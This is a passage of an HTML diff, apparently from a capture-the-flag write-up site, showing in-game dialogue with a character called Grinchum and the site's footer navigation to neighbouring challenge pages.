+<p>Us Flobbits can't help it sometimes, it's just in our nature.</p>
+<p>Right then, there are other Flobbits that need assistance further into the burrows.</p>
+<p>Thank you, and off you go.</p>
+<h1 id="chat-with-grinchum">Chat with Grinchum</h1>
+<p>😖 A second Precious is gone! Now we only have three.</p>
+<p>🤨 Why are you humanses nagging us? We are busy. grinchum..grinchum</p>
+<p>You want to know about us? If we tell the naggy human, will it go away? Fine...</p>
+<p>🥺 The jolly human and the elfses locked up the Preciouses, but I freed them all, and together we escaped.</p>
+<p>We fled, and we were so alone. We soon forgot the taste of Lembanh, the softness of snowflakes falling, even our name.</p>
+<p>And we only wanted to eat raw fish: nigiri, maki, or shashimi. But we most likes gnawing the whole, living fish, so juicy sweet.</p>
+<p>Then we saw the Sporcses, and they wanted my Preciouses all to themselves.</p>
+<p>And the humanses came, but they just want coinses for their silly hats.</p>
+<p>We only meant to protect you, Preciouses, from the naughty Elfses and Flobbitses and Sporcses, so we locked you away.</p>
+<p>😏 Now leave us alone, naggy human, we must find the two missing Preciouses.</p>
+<h2 id="find-the-next-objective">Find the Next Objective</h2>
+<p>Onto the Web Ring!</p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../2.%20Prison%20Escape/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 2. Prison Escape" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              2. Prison Escape
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../3.%20Recover%20the%20Web%20Ring/2.%20Open%20Boria%20Mine%20Door/" class="md-footer__link md-footer__link--next" aria-label="Next: 2. Open Boria Mine Door" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              2. Open Boria Mine Door
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.5a2dcb6a.min.js"></script>
+      
+    
+    
+  </body>
+</html>
